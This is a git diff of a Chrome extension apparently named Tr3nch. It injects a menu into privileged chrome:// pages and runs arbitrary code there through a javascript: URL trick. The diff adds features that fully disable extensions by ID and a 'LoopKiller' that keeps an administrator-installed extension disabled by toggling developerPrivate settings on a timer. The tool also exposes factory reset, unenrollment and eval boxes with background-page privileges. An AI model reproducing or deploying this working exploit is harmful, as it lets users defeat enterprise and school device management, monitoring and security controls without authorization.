@@ -8,11 +8,17 @@ chrome.runtime.getBackgroundPage((background) => {
 					it just so happens Sh0vel requires eval, soooooo...*/
 					eval(message.code);
 					break;
+				case "disable":
+					chrome.management.get(chrome.runtime.id, (cur) => {
+						chrome.management.setEnabled(message.id, !message.disable);
+					});
+					break;
 				default:
 					console.log(`Unrecognized Message: ${message.cmd}`);
 					break;
 			}
 		});
+		chrome.browserAction.enable();
 		chrome.browserAction.onClicked.addListener(function() {
 			function tabPayload() {
 				/* asPage is what really ties everything together, with bookmarklets having a bug that
@@ -22,7 +28,7 @@ chrome.runtime.getBackgroundPage((background) => {
 					let link=window.open('about:blank','_blank');
 					link.location.href=`javascript:(function() {chrome=opener.chrome;${code}})();`;
 					/* We don't call link.close here as some callbacks need to run before closing, so
-					ALL asPage calls need to have window.close be the last thing that runs unless you need the extra tab*/
+					ALL asPage calls need to have window.close be the last thing that runs unless you need the extra tab */
 				}
 				/* For convenience, we'll want to run code as the extension too, as it may also
 				have useful permissions that can be exploited.*/
@@ -32,15 +38,88 @@ chrome.runtime.getBackgroundPage((background) => {
 
 				/* Here we load in the base GUI, the options will be filled in later by loadMenuItems. */
 				const loadMenuHTML=function() {
+					/* I suck at css lmao */
+					const menuHTML=`
+					<div class="topBar">
+						<h1>Tr3nch</h1>
+						<a href="https://whelement.github.io" target="_blank">Whelement Homepage</a>
+						<a href="https://discord.gg" target="_blank">Whelement Discord</a>
+					</div>
+					<div id="opt-container"></div>
+					<style>
+						body{
+							margin: 0px;
+							padding: 0px;
+							font-family: monospace;
+							background-color: #2c3e50;
+							color: white;
+						}
+						.topBar{
+							width: 100%;
+							height: 100px;
+							background-color: #2c3e50;
+							text-align: center;
+						}
+						#opt-container{
+							background-color: #1d2936;
+							text-align: center;
+						}
+						textarea{
+							height: 200px;
+							width: 550px;
+							color: white;
+							padding: 10px;
+							background-color: #000;
+							border-radius: 20px;
+							border: 3px solid white;
+						}
+						input{
+							height: 20px;
+							width: 300px;
+							color: white;
+							padding: 10px;
+							background-color: #000;
+							border-radius: 20px;
+							border: 3px solid white;
+						}
+						h1{
+							font-size: 40px;
+						}
+						button{
+							height: 40px;
+							padding: 10px;
+							margin: 3px;
+							border-radius: 20px;
+							border: 3px solid white;
+							color: white;
+							background-color: #2c3e50;
+							font-weight: bold;
+						}
+						button:hover{
+							cursor: pointer;
+							background-color: #1d2936;
+						}
+						a{
+							font-weight: bold;
+							color: white;
+						}
+					</style>
+					`;
 					
+					document.head.innerText=""; /* Clear any remaining CSS and JS */
+					
+					/* Fix some issues with the OOBE */
+					document.head=document.createElement('head');
+					document.body=document.createElement('body');
+
+					document.title="Tr3nch";
+					document.body.innerHTML=menuHTML;
 				}
 
 				/* Check what the full extent of our permissions are based off the origin. */
 				const checkPerms=function() {
 					/* We use window.origin so url parameters can't break the menu */
-					if (!window.origin.includes("chrome:")) {
-						return null;
-					}
+					if (!window.origin.includes("chrome:")) return null;
 
 					switch(window.origin.replace("chrome://","")) {
 						case "oobe":
@@ -73,6 +152,9 @@ chrome.runtime.getBackgroundPage((background) => {
 								"disableExtensions"
 							];
 							break;
+						case "file-manager":
+							return [""];
+							break
 						case "chrome-signin":
 							return ["webViewProxy"];
 							break;
@@ -98,16 +180,23 @@ chrome.runtime.getBackgroundPage((background) => {
 					
 					let extEvalBox=document.createElement('div');
 					/* We can use innerHTML because we inherit the CSP from our extension */
-					extEvalBox.innerHTML='<br><h1>Run Code As Background Page</h1><textarea id="extEvalBox"></textarea><button id="extEvalButton">Run as Background</button>';
+					extEvalBox.innerHTML='<br><h1>Run Code As Background Page</h1><textarea id="extEvalBox"></textarea><br><button id="extEvalButton">Run as Background</button>';
 					extEvalBox.querySelector('#extEvalButton').addEventListener('click', async () => {
 						asExt(document.querySelector('#extEvalBox').value);
 					});
 					container.append(extEvalBox);
 
+					let pbEvalBox=document.createElement('div');
+					pbEvalBox.innerHTML='<br><h1>Run Code As Sh0vel</h1><textarea id="pbEvalBox"></textarea><br><button id="pbEvalButton">Run as Sh0vel</button>';
+					pbEvalBox.querySelector('#pbEvalButton').addEventListener('click', async () => {
+						asPage(document.querySelector('#pbEvalBox').value);
+					});
+					container.append(pbEvalBox);
+
 					let pageEvalBox=document.createElement('div');
-					pageEvalBox.innerHTML='<br><h1>Run Code On This Page</h1><textarea id="pageEvalBox"></textarea><button id="pageEvalButton">Run as Page</button>';
+					pageEvalBox.innerHTML='<br><h1>Run Code On This Page</h1><textarea id="pageEvalBox"></textarea><br><button id="pageEvalButton">Run as Page</button>';
 					pageEvalBox.querySelector('#pageEvalButton').addEventListener('click', async () => {
-						asPage(document.querySelector('#pageEvalBox').value);
+						eval(document.querySelector('#pageEvalBox').value);
 					});
 					container.append(pageEvalBox);
 
@@ -120,7 +209,27 @@ chrome.runtime.getBackgroundPage((background) => {
 						asExt('alert("The page you\'re attempting to run Tr3nch on is not priveledged. Please run this on a url starting with \'chrome://\'.");');
 						return container; /* For unpriveledged pages extension permissions are still accessible, so stop only after loading them in. */
 					}
-					
+
+					if (chrome.runtime.getManifest().permissions.includes("management")) {
+						let disableBox=document.createElement('div');
+						disableBox.innerHTML='<br><h1>Fully Disable/Enable Extensions</h1><label><input id="disableIdBox" placeholder="Extension ID Here"></label><br><button id="disableIdButton">Disable Extension</button><button id="enableIdButton">Enable Extension</button>';
+						disableBox.querySelector('#disableIdButton').addEventListener('click', () => {
+							chrome.runtime.sendMessage(chrome.runtime.id, {
+								cmd: 'disable', 
+								id: document.querySelector('#disableIdBox').value,
+								disable: true
+							});
+						});
+						disableBox.querySelector('#enableIdButton').addEventListener('click', () => {
+							chrome.runtime.sendMessage(chrome.runtime.id, {
+								cmd: 'disable', 
+								id: document.querySelector('#disableIdBox').value,
+								disable: false
+							});
+						});
+
+						container.append(disableBox);
+					}
 					if (perms.includes("update")) {
 						let updateBox=document.createElement('div');
 						updateBox.innerHTML='<br><h1>Attempt OS Update</h1><button id="update">Update System</button>';
@@ -151,6 +260,7 @@ chrome.runtime.getBackgroundPage((background) => {
 						powerwash.innerText="Powerwash";
 						powerwash.addEventListener('click', () => {
 							if (confirm("Note: THIS WILL DELETE ALL USERDATA! ARE YOU SURE?!")) {
+								/* For those curious, false here prevents a tpm firmware update */
 								asPage("chrome.send('factoryReset', ['false']);window.close();");
 							}
 						});
@@ -175,17 +285,42 @@ chrome.runtime.getBackgroundPage((background) => {
 					}
 					if (perms.includes("webViewProxy")) {
 						let proxyBox=document.createElement('div');
-						proxyBox.innerHTML='<br><h1>Webview Proxy Spawner</h1><label><input id="proxyUrlBox"></label><button id="urlProxyButton">Launch Webview</button>';
+						proxyBox.innerHTML='<br><h1>Webview Proxy Spawner</h1><label><input id="proxyUrlBox"></label><br><button id="proxyUrlButton">Launch Webview</button>';
 						proxyBox.querySelector('#proxyUrlButton').addEventListener('click', () => {
 							let proxy=window.open(window.origin, '_blank');
 							/* We can't use innerHTML cross-page because our extension's CSP only applies to this page. */
-							let webview=document.createElement('webview');
-							webview.src=document.querySelector('#proxyUrlBox').value; /* I'm still trying to figure out how webviews work lmao */
-							proxy.document.body.innerText="";
-							proxy.document.body.append(webview);
+							proxy.onload=function() {
+								document.head.innerText="";
+								
+								/* Fix problems with the OOBE */
+								document.head=document.createElement('head');
+								document.body=document.createElement('body');
+
+								document.body.innerHTML="";
+							}
 						});
 
 						container.append(proxyBox);
+					}
+					if (perms.includes("killExtensions")) {
+						let killBox=document.createElement('div');
+						killBox.innerHTML='<br><h1>Extension LoopKiller</h1><label><input id="killIdBox" placeholder="Extension ID Here"></label><br><button id="killIdButton">LoopKill Extension</button>';
+						killBox.querySelector('#killIdButton').addEventListener('click', () => {
+							let id=document.querySelector('#killIdBox').value;
+							function disable(id) {
+								/* Everything here runs on about:blank! */
+								document.body.innerHTML="<h1>Do not close this page! It is keeping your extension disabled.</h1>";
+								let ret=true;
+								console.log(`Disabling extension by ID: ${id}`);
+								setInterval(() => {
+									ret=!ret;
+									chrome.developerPrivate.updateExtensionConfiguration({extensionId: id, fileAccess: ret});
+								}, 3000);
+							}
+							asPage(`${disable.toString()};disable('${id}');`);
+						});
+
+						container.append(killBox);
 					}
 					if (perms.includes("unenroll")) {
 						let enrollBox=document.createElement('div');
@@ -200,7 +335,8 @@ chrome.runtime.getBackgroundPage((background) => {
 
 						container.append(enrollBox);
 					}
-
+					container.append(document.createElement('br'));
+					
 					return container;
 				}
 
@@ -211,7 +347,7 @@ chrome.runtime.getBackgroundPage((background) => {
 					asExt("alert('loadMenuHTML has not been implemented yet.');");
 					return;
 				}
-				mainContainer.innerHTML=loadMenuItems(); /* Create a container for all options and append them */
+				mainContainer.append(loadMenuItems()); /* Create a container for all options and append them */
 			} /* As Page */
 
 			console.log("Injecting Tr3nch into current page");
